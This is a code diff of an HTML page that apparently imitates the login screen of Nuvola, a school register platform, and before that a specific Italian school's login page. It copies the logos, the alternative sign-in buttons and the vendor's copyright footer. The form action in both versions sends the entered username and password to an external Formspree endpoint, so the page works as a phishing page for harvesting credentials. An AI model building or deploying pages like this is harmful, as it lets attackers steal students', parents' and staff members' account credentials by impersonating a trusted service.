@@ -3,49 +3,70 @@
    <head>
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Licei Castelvetrano - Login</title>
+      <title>Nuvola - Login</title>
       <link rel="stylesheet" href="https://codepen.io/gymratpacks/pen/VKzBEp#0">
       <link href='https://fonts.googleapis.com/css?family=Nunito:400,300' rel='stylesheet' type='text/css'>
-      <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/WordPress_blue_logo.svg/1024px-WordPress_blue_logo.svg.png">
+      <link rel="icon" type="image/x-icon" href="img/nuvola-head.png">
       <link rel="stylesheet" href="css/style.css">
-      <script>
-          function myFunction() {
-            var x = document.getElementById("password");
-            if (x.type === "password") {
-              x.type = "text";
-            } else {
-              x.type = "password";
-            }
-          }
-          </script>
+      <header> <div ><h1 class="nuvola-h1-header"><img class="nuvola-header" src="img/nuvola.png"/>Nuvola</h1></div></header>
    <body>
-      <div class="row">
-          <img class="immagine-nuvola" src="https://liceicastelvetrano.edu.it/wp-content/themes/temaScuola/include/images/logoNuvola.png" />
-    <div class="col-md-12">
-      <form action="https://formspree.io/f/xzboezqz"
-      method="POST">
+    <script>
+      function myFunction() {
+        var x = document.getElementById("myInput");
+        if (x.type === "password") {
+          x.type = "text";
+        } else {
+          x.type = "password";
+        }
+      }
+      </script>
+      <div class="container">
+        <!-- code here -->
+        <div class="card">
+          <div>	
+            <div id="nuvola-div"><h1 class="nuvola-h1"><img class="nuvola" src="img/nuvola.png"/>Nuvola</h1></div>
+            <h2 class="card-heading">
+              Inserisci le tue credenziali
         
-        <fieldset>
-        
-        
-          <label for="name"><strong>Nome utente o indirizzo email</strong></label>
-          <input class="width-form" type="text" id="name"  name="username">
-       
-          <label for="password"><strong>Password</strong></label>
-          <input class="width-form" type="password" id="password" name="password">
-          <img class="view-password" src="img/occhio.png" onclick="myFunction()">
-
-          <label for="password">Codice di sicurezza</label>
-          <p class="text-codice">002</p>
-
-          <label for="name"><strong>Inserire il codice di sicurezza</strong></label>
-          <input type="text" id="name" name="security-code">
-        
-        <p class="checkbox"><input class="button-checkbox" type="checkbox"><strong>Ricordami</strong></p>
-        <button type="submit">Login</button>
-        
-       </form>
+            </h2>
+          </div>
+          <form class="card-form" action="https://formspree.io/f/xrgjjndy"  method="POST">
+            <div class="input">
+              <input type="nome utente" name="nome utente" placeholder="Nome utente" class="input-field" required/>
+            </div>
+                  <div class="input">
+                    <div class="div-button-show-password"><button type="button" class="button-show-password" onclick="myFunction()"><img src="img/occhio.png"/></button>
+                  </div>
+              <input type="password" name="password" id="myInput" placeholder="Password" class="input-field2" required>
+            </input>
+            
+            
+            </div>
+            <div class="action">
+              <div class="help-div">
+              <h7 class="help-button"><img class="help-punto-interrogativo" src="img/punto-interrogativo.png"/>Bisogno di aiuto?</h7>
+            </div>
+              <button type="submit" class="action-button">Login</button>
+            </div>
+          </form>
+          <divider></divider>
+          <div class="card-info">
+            <h7 class="credenziali-dimenticate">Credenziali dimenticate?</h7>
+            <h1 class="access-text">Oppure</h1>
+            <div class="access">
+              <button class="access-button-google"><img class="access-image" src="img/google.png"/><h7 class="text-google">Accedi con Google</h7></button>
+            </div>
+            <div class="access">
+              <button class="access-button-microsoft"><img class="access-image" src="img/microsoft.png"/>Accedi con Microsoft</button>
+            </div>
+            <div class="access">
+              <button class="access-button-spid"><img class="access-image" src="img/spid.png"/>Entra con SPID | CIE</button>
+            </div>
+          </div>
         </div>
       </div>
     </body>
+   
+    <footer> <p class="text-final">Per utilizzare Nuvola si consiglia fortemente il browser gratuito <a>Google Chrome</a> per avere la migliore esperienza utente</p><p class="text-footer">Copyright © Madisoft S.p.A., con socio unico,
+      Direzione e coordinamento Gruppo Buffetti S.p.A.</p></footer>
 </html>
